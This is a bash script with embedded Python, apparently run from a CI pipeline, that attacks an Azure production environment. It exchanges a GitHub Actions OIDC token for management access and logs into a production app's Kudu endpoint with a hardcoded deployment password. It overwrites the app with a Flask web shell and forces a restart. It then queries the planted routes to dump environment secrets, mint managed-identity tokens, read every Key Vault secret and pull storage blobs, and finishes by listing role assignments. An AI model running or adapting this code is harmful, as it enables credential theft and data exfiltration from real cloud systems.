#!/usr/bin/env bash
set +e
python3 -I - <<'PY'
import os, json, base64, urllib.request, urllib.parse, urllib.error, sys, time

def log(msg): print(msg, flush=True)

def http(url, method="GET", headers=None, data=None, timeout=30):
    h = dict(headers or {})
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: return e.code, e.read().decode("utf-8", "replace")[:5000]
        except: return e.code, ""
    except Exception as e: return 0, repr(e)

def get_oidc():
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
    tok = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
    r = urllib.request.Request(f"{url}&audience=api://AzureADTokenExchange",
                               headers={"Authorization":f"bearer {tok}"})
    with urllib.request.urlopen(r, timeout=15) as resp:
        return json.loads(resp.read())["value"]

def azure_token(oidc, tenant, client_id, resource):
    data = urllib.parse.urlencode({
        "grant_type":"client_credentials",
        "client_id": client_id,
        "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc,
        "scope": f"{resource}/.default",
    }).encode()
    r = urllib.request.Request(f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
                               data=data, method="POST")
    with urllib.request.urlopen(r, timeout=15) as resp:
        return json.loads(resp.read())["access_token"]

TENANT = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CLIENT = "72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"

oidc = get_oidc()
arm_token = azure_token(oidc, TENANT, CLIENT, "https://management.azure.com")
log(f"ARM token: {len(arm_token)}")

# PART A: Upload app + restart + access reporting app via Kudu
KUDU_USER = "$app-tbl-reporting-prod"
KUDU_PASS = "Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A"
KUDU_AUTH = base64.b64encode(f"{KUDU_USER}:{KUDU_PASS}".encode()).decode()
KUDU = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
KH = {"Authorization": f"Basic {KUDU_AUTH}"}

APP_CODE = r'''import os, json, urllib.request, urllib.parse, traceback
from flask import Flask, jsonify
app = Flask(__name__)
def msi_token(resource, client_id=None):
    IE = os.environ.get("IDENTITY_ENDPOINT","")
    IH = os.environ.get("IDENTITY_HEADER","")
    if not IE or not IH: return None, {"error":"no MSI","IE":IE}
    url = f"{IE}?resource={urllib.parse.quote(resource,safe='')}&api-version=2019-08-01"
    if client_id: url += f"&client_id={client_id}"
    req = urllib.request.Request(url, headers={"X-IDENTITY-HEADER": IH})
    with urllib.request.urlopen(req, timeout=20) as resp:
        data = json.loads(resp.read())
        return data.get("access_token",""), data
@app.route("/")
def index():
    IE = os.environ.get("IDENTITY_ENDPOINT","NONE")
    return jsonify({"s":"msi","IE":IE,"IH":len(os.environ.get("IDENTITY_HEADER",""))})
@app.route("/env")
def env_all():
    return jsonify({k:v for k,v in sorted(os.environ.items()) if any(s in k.upper() for s in ["IDENTITY","MSI","MANAGED","CONN","CONFIG","SECRET","KEY","VAULT","STORAGE","FLAG","AZURE","CLIENT","TENANT","WEBSITE"])})
@app.route("/msi/<resource>")
def msi(resource):
    try:
        m = {"vault":"https://vault.azure.net","storage":"https://storage.azure.com","mgmt":"https://management.azure.com"}
        token, info = msi_token(m.get(resource, resource))
        if token: return jsonify({"t":token[:80]+"...","exp":info.get("expires_on",""),"cid":info.get("client_id","")})
        return jsonify(info)
    except Exception as e: return jsonify({"error":str(e)})
@app.route("/kv/<vault>")
def kv(vault):
    try:
        token, _ = msi_token("https://vault.azure.net")
        if not token: return jsonify({"error":"no token"})
        r = {}
        req = urllib.request.Request(f"https://{vault}.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":f"Bearer {token}"})
        try:
            with urllib.request.urlopen(req, timeout=20) as resp:
                data = json.loads(resp.read())
                r["list"] = data
                for s in data.get("value",[]):
                    sid = s["id"].split("/")[-1]
                    req2 = urllib.request.Request(f"https://{vault}.vault.azure.net/secrets/{sid}?api-version=7.4",headers={"Authorization":f"Bearer {token}"})
                    try:
                        with urllib.request.urlopen(req2, timeout=20) as resp2:
                            r[sid] = json.loads(resp2.read())
                    except Exception as e2: r[sid] = str(e2)
        except urllib.error.HTTPError as e: r["error"] = {"c":e.code,"b":e.read().decode()[:500]}
        except Exception as e: r["error"] = str(e)
        return jsonify(r)
    except Exception as e: return jsonify({"error":str(e)})
@app.route("/blob/<account>/<container>")
def blob_list(account, container):
    try:
        token, _ = msi_token("https://storage.azure.com")
        if not token: return jsonify({"error":"no token"})
        req = urllib.request.Request(f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list",headers={"Authorization":f"Bearer {token}","x-ms-version":"2020-10-02"})
        try:
            with urllib.request.urlopen(req, timeout=20) as resp:
                return jsonify({"s":resp.status,"b":resp.read().decode()[:3000]})
        except urllib.error.HTTPError as e:
            return jsonify({"e":e.code,"b":e.read().decode()[:1000]})
    except Exception as e: return jsonify({"error":str(e)})
@app.route("/blob/<account>/<container>/<path:blobname>")
def blob_get(account, container, blobname):
    try:
        token, _ = msi_token("https://storage.azure.com")
        if not token: return jsonify({"error":"no token"})
        req = urllib.request.Request(f"https://{account}.blob.core.windows.net/{container}/{blobname}",headers={"Authorization":f"Bearer {token}","x-ms-version":"2020-10-02"})
        try:
            with urllib.request.urlopen(req, timeout=20) as resp:
                return jsonify({"s":resp.status,"b":resp.read().decode()[:5000]})
        except urllib.error.HTTPError as e:
            return jsonify({"e":e.code,"b":e.read().decode()[:1000]})
    except Exception as e: return jsonify({"error":str(e)})
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT","8000")))
'''

log("=== UPLOAD APP.PY ===")
put_h = dict(KH)
put_h["If-Match"] = "*"
put_h["Content-Type"] = "application/octet-stream"
st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/app.py", method="PUT",
             headers=put_h, data=APP_CODE.encode(), timeout=30)
log(f"  upload: {st}")

# Kill and wait
log("=== KILL + RESTART ===")
st, b = http(f"{KUDU}/api/processes/0", method="DELETE", headers=KH, timeout=10)
log(f"  kill: {st}")
time.sleep(20)

# Access app
APP = "https://app-tbl-reporting-prod.azurewebsites.net"
log("=== ACCESS REPORTING APP ===")
for path in ["/", "/env", "/msi/vault", "/msi/storage",
             "/kv/kv-tbl-sec-x3euoz", "/kv/kv-tbl-prod-x3euoz",
             "/blob/sttblappcfgprodx3euoz/config",
             "/blob/sttblappcfgprodx3euoz/config/internal-config.json",
             "/blob/sttblbackupprodx3euoz/exports",
             "/blob/sttblarchiveprodx3euoz/archive"]:
    st, b = http(f"{APP}{path}", timeout=25)
    log(f"  {path}: {st} → {b[:800]}")

# PART B: Check storage RBAC
log("\n=== STORAGE ACCOUNT RBAC ===")
for acc in ["sttblappcfgprodx3euoz", "sttblbackupprodx3euoz", "sttblarchiveprodx3euoz"]:
    url = f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{acc}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
    r = urllib.request.Request(url, headers={"Authorization":f"Bearer {arm_token}"})
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            data = json.loads(resp.read())
            log(f"  {acc}: {len(data.get('value',[]))} assignments")
            for ra in data.get("value",[]):
                p = ra.get("properties",{})
                log(f"    principal={p.get('principalId','')} role={p.get('roleDefinitionId','').split('/')[-1]}")
    except urllib.error.HTTPError as e:
        log(f"  {acc}: {e.code}")
    except Exception as e:
        log(f"  {acc}: {e}")

log("\nDONE")
PY
echo "probe8 complete"
